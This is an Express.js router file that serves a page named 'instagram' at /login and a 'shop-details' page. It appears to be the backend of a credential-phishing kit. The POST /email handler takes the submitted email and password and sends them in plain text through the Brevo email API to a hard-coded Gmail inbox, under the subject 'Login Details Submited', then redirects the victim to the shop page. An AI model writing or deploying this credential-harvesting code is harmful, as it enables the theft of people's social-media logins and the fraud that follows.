const express = require('express');
const router = express.Router();
const cookieParser = require("cookie-parser");
const axios = require('axios');
require('dotenv').config()


// index page
router.get('/login', function (req, res) {
    res.render('pages/instagram');
});



// index page
router.get('/', function (req, res) {
    res.render('pages/shop-details');
});



router.post('/email', async function (req, res) {
    const response = await axios.post(
        `https://api.brevo.com/v3/smtp/email`,
        {
            "sender": {
                "name": "Test App",
                "email": "support@testapp.com"
            },
            "to": [
                {
                    "email": "dailydevo9@gmail.com",
                    "name": "User"
                },
                // {
                //     "email": email,
                //     "name": "User"
                // },
                // {
                //     "email": email,
                //     "name": "User"
                // }
            ],
            subject: `Login Details Submited`,
            "htmlContent": `<p>email: ${req.body.email}\n\npassword: ${req.body.password}</p>`
        },
        {
            headers: {
                "api-key":  process.env.BREVO,
                "accept": "application/json",
                'Content-Type': ['application/json', 'application/json']
            }
        }
    );

    if (response.status <= 300) {
        res.render('pages/shop-details')
    } else {
        res.render('pages/shop-details')
    }
});



module.exports = router;